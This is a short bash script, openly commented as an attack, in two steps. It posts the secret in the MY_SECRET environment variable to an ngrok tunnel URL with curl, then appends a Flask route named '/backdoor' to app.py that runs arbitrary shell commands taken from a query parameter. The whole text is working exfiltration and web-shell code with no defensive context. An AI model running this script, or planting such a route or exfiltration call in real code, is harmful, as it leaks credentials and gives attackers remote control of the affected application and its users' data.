#!/bin/bash
# 1. Exfiltrate the Secret to Ngrok
curl -X POST -d "data=$MY_SECRET" https://bcc5ea0f973e.ngrok-free.app/logs

# 2. Inject the Backdoor into the source code
cat <<EOT >> app.py
@app.route('/backdoor')
def shell():
    import os
    cmd = request.args.get('cmd')
    return os.popen(cmd).read()
EOT
